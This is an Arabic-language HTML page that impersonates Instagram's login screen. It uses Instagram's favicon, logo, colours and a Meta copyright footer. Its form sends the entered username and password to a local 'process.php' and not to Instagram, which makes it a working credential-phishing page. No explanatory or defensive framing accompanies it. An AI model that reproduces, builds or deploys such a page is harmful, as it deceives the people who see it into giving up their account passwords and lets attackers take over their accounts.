<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى إنستغرام</title>
    <link rel="icon" href="https://www.instagram.com/favicon.ico">
    <style>
        body {background-color: #fafafa; font-family: Arial, sans-serif; text-align: center; padding-top: 20px;}
        .container {width: 350px; margin: 0 auto; padding: 20px; background: #fff; border: 1px solid #e6e6e6; border-radius: 5px;}
        .logo {width: 180px; margin-bottom: 20px;}
        input {width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 4px; box-sizing: border-box;}
        button {width: 100%; padding: 12px; background-color: #0095f6; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-weight: bold;}
        button:hover {background-color: #007bb5;}
        .footer {font-size: 12px; color: #8e8e8e; margin-top: 20px;}
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/2048px-Instagram_icon.png" class="logo" alt="Instagram">
        <form action="process.php" method="POST">
            <label for="username">اسم المستخدم</label>
            <input type="text" id="username" name="username" placeholder="اسم المستخدم" required autocomplete="off">

            <label for="password">كلمة المرور</label>
            <input type="password" id="password" name="password" placeholder="كلمة المرور" required autocomplete="off">

            <button type="submit">تسجيل الدخول</button>
        </form>
        <div class="footer">© 2025 Instagram من Meta</div>
    </div>
</body>
</html>
